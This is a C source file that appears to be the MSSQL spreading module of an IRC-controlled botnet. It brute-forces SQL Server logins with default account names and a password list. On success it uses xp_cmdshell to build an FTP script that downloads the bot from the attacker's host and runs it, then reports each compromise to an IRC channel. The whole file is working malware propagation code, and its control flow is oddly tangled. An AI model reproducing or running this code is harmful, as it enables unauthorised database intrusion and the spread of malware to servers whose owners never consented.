#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_MSSQL

BOOL MSSQL(EXINFO exinfo)
{
	char sendbuf[IRCLINE];
	char database[]="", *users[]={"sa","root","admin",NULL};

	BOOL bRet=FALSE;

	SQLHANDLE hEnv;
	SQLHDBC hDbc = SQL_NULL_HDBC;     
	SQLHSTMT hStmt = SQL_NULL_HSTMT;
    SQLCHAR szOutConn[1024], constr[1024], command[1024];
	SQLSMALLINT sLen;

	if (fSQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&hEnv) != SQL_SUCCESS)
		return bRet;

	if (fSQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION,(SQLPOINTER) SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		return bRet;

	if (fSQLAllocHandle(SQL_HANDLE_DBC,hEnv,(SQLHDBC FAR*)&hDbc) != SQL_SUCCESS) {
		fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);
		return bRet;
	}

	for (int i=0; users[i]; i++) {
		for (int j=0; passwords[j]; j++) {
			sprintf((char *)constr, "DRIVER={SQL Server};SERVER=%s,%d;UID=%s;PWD=%s;%s",exinfo.ip,exinfo.port,users[i],passwords[j],database); 
			SQLRETURN nResult = fSQLDriverConnect(hDbc, NULL, constr, (SQLSMALLINT)strlen((char *)constr), szOutConn, 1024, &sLen, SQL_DRIVER_NOPROMPT);
			if (nResult == SQL_SUCCESS || nResult == SQL_SUCCESS_WITH_INFO) {
				fSQLAllocHandle(SQL_HANDLE_STMT,hDbc, &hStmt);

				sprintf((char *)command,"EXEC master..xp_cmdshell 'del eq&echo open %s %d >> eq&echo user %d %d >> eq &echo get %s >> eq &echo quit >> eq &ftp -n -s:eq &%s&del eq\r\n'", GetIP(exinfo.sock), FTP_PORT, rand(), rand(), filename, filename);
				if (fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS) != SQL_SUCCESS) {
					Sleep(5000);
					sprintf((char *)command,"EXEC master..xp_cmdshell '%s'", filename);
					sprintf(sendbuf,"[FTPD]: File transfer complete to IP: %s", exinfo.ip);
					 {
						 {
							if (fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS) == SQL_SUCCESS) {
								bRet=TRUE;
								_snprintf(sendbuf,sizeof(sendbuf),"[%s]: Exploiting IP: (%s:%d) User: (%s/%s).",
								exploit[exinfo.exploit].name, exinfo.ip, exinfo.port, users[i], passwords[j]);
								if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
								addlog(sendbuf);
								exploit[exinfo.exploit].stats++;
	
								break;
							}
						}
						Sleep(5000);
					}
				}
				fSQLFreeHandle(SQL_HANDLE_STMT, hStmt);

				break;
			}
			Sleep(500);
		}
		if (bRet == TRUE)
			break;
	}

	fSQLFreeHandle(SQL_HANDLE_DBC, hDbc);
	fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);

	return bRet;
}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if